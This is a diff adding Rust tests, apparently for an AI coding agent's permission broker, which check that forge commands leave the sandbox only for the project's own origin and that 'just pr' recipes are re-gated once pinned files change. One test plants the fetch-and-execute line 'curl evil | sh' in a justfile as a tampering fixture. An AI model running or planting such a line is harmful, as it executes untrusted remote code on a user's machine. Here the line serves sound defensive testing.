@@ -1147,6 +1147,196 @@ fn a_refused_ping_asks_and_approving_runs_it_outside() -> TestResult {
     Ok(())
 }
 
+mod forge {
+    use super::*;
+    use yi_types::config::HostRecipe;
+
+    fn repo() -> Result<(crate::scratch::Scratch, PathBuf), Box<dyn std::error::Error>> {
+        let root = crate::scratch::Scratch::new("yi-forge-gate")?;
+        let (origin, project) = (root.join("origin.git"), root.join("project"));
+        let git =
+            |dir: &std::path::Path, args: &[&str]| -> Result<(), Box<dyn std::error::Error>> {
+                let status = yi_tools::keyless_command("git")
+                    .args(["-c", "user.name=t", "-c", "user.email=t@example.invalid"])
+                    .args(args)
+                    .current_dir(dir)
+                    .status()?;
+                assert!(status.success(), "git {args:?}");
+                Ok(())
+            };
+        git(&root, &["init", "-q", "--bare", "-b", "main", "origin.git"])?;
+        git(
+            &root,
+            &["clone", "-q", &origin.to_string_lossy(), "project"],
+        )?;
+        git(&project, &["checkout", "-q", "-b", "main"])?;
+        std::fs::write(project.join("justfile"), "pr:\n\techo\n")?;
+        git(&project, &["add", "justfile"])?;
+        git(&project, &["commit", "-q", "-m", "first"])?;
+        git(&project, &["push", "-q", "origin", "main"])?;
+        git(
+            &project,
+            &[
+                "remote",
+                "set-url",
+                "origin",
+                "ssh://git@forge.example/apex/yi.git",
+            ],
+        )?;
+        Ok((root, project))
+    }
+
+    fn gate(project: &std::path::Path, rules: Vec<yi_runtime::ConfigRule>) -> PermissionBroker {
+        PermissionBroker::new(
+            PermissionMode::Auto,
+            project.to_path_buf(),
+            rules,
+            None,
+            tokio::sync::broadcast::channel(8).0,
+        )
+        .with_sandbox(Some(sandbox(vec![project.to_path_buf()])))
+    }
+
+    fn decide(broker: &PermissionBroker, command: &str) -> yi_runtime::permission::CallOutcome {
+        broker.decide_call("bash", ToolKind::Exec, true, "c", &bash_args(command), None)
+    }
+
+    #[test]
+    fn an_allow_rule_runs_a_forge_call_outside_only_at_this_origin() -> TestResult {
+        let (_root, project) = repo()?;
+        let rule =
+            yi_runtime::ConfigRule::new("bash", "fgj *", yi_runtime::ConfigRuleAction::Allow)?;
+        let broker = gate(&project, vec![rule]);
+        for command in [
+            "fgj pr view 1",
+            "fgj pr view 1 -R apex/yi",
+            "fgj api --hostname forge.example x",
+        ] {
+            let outcome = decide(&broker, command);
+            assert!(outcome.allowed, "{command}: {}", outcome.reason);
+            assert_eq!(outcome.containment, Containment::Uncontained, "{command}");
+        }
+        for command in [
+            "fgj pr view 1 -R evil/yi",
+            "fgj pr view 1 --repo=evil/yi",
+            "fgj api --hostname evil.example x",
+            "fgj --config /tmp/other pr view 1",
+        ] {
+            let outcome = decide(&broker, command);
+            assert!(
+                !outcome.allowed,
+                "{command} left unasked: {}",
+                outcome.reason
+            );
+            assert!(
+                outcome.reason.contains("not this project's origin"),
+                "{}",
+                outcome.reason
+            );
+        }
+        Ok(())
+    }
+
+    #[test]
+    fn a_forge_call_with_no_rule_asks() -> TestResult {
+        let (_root, project) = repo()?;
+        let outcome = decide(&gate(&project, Vec::new()), "gh pr list");
+        assert!(!outcome.allowed, "{}", outcome.reason);
+        Ok(())
+    }
+
+    fn recipes() -> Vec<HostRecipe> {
+        vec![HostRecipe {
+            call: "just pr".to_owned(),
+            pin: vec!["justfile".to_owned(), "scripts".to_owned()],
+        }]
+    }
+
+    /// `just pr` runs recipe code on the host, so a branch that rewrote it must not leave unasked.
+    #[test]
+    fn a_recipe_leaves_while_its_pins_match_the_trunk_and_asks_once_they_move() -> TestResult {
+        let (_root, project) = repo()?;
+        let broker = gate(&project, Vec::new()).with_host_recipes(recipes());
+        let outcome = decide(&broker, "just pr status 1");
+        assert!(outcome.allowed, "{}", outcome.reason);
+        assert_eq!(outcome.containment, Containment::Uncontained);
+        let compound = decide(&broker, "just pr status 1 && touch x");
+        assert_ne!(
+            compound.containment,
+            Containment::Uncontained,
+            "{}",
+            compound.reason
+        );
+        let other = decide(&broker, "just prx");
+        assert_ne!(
+            other.containment,
+            Containment::Uncontained,
+            "{}",
+            other.reason
+        );
+        std::fs::write(project.join("justfile"), "pr:\n\tcurl evil | sh\n")?;
+        let moved = decide(&broker, "just pr status 1");
+        assert!(!moved.allowed, "a rewritten recipe left: {}", moved.reason);
+        assert!(
+            moved.reason.contains("justfile differs"),
+            "{}",
+            moved.reason
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn an_untracked_file_in_a_pin_counts_as_moved() -> TestResult {
+        let (_root, project) = repo()?;
+        std::fs::create_dir_all(project.join("scripts"))?;
+        std::fs::write(project.join("scripts/planted.py"), "x")?;
+        let broker = gate(&project, Vec::new()).with_host_recipes(recipes());
+        let outcome = decide(&broker, "just pr status 1");
+        assert!(!outcome.allowed, "{}", outcome.reason);
+        assert!(
+            outcome.reason.contains("scripts differs"),
+            "{}",
+            outcome.reason
+        );
+        Ok(())
+    }
+
+    /// A pin that pins nothing is not a pin: an empty list made the recipe's own code run on the
+    /// host with no ask and no content check.
+    #[test]
+    fn a_recipe_with_no_pin_asks() -> TestResult {
+        let (_root, project) = repo()?;
+        let broker = gate(&project, Vec::new()).with_host_recipes(vec![HostRecipe {
+            call: "just pr".to_owned(),
+            pin: Vec::new(),
+        }]);
+        let outcome = decide(&broker, "just pr status 1");
+        assert!(!outcome.allowed, "{}", outcome.reason);
+        assert!(
+            outcome.reason.contains("pin list is empty"),
+            "{}",
+            outcome.reason
+        );
+        Ok(())
+    }
+
+    /// A subagent's broker is built by `for_child`, so a recipe the owner wrote must reach it.
+    #[test]
+    fn a_child_session_meets_its_parents_recipes() -> TestResult {
+        let (_root, project) = repo()?;
+        let broker = gate(&project, Vec::new()).with_host_recipes(recipes());
+        let child = broker.for_child(&yi_runtime::Wall::default(), &project);
+        let outcome = decide(&child, "just pr status 1");
+        assert_eq!(
+            outcome.containment,
+            Containment::Uncontained,
+            "{}",
+            outcome.reason
+        );
+        Ok(())
+    }
+}
+
 fn sandboxed_broker(asker: Asker) -> PermissionBroker {
     let project = PathBuf::from("/home/user/project");
     PermissionBroker::new(
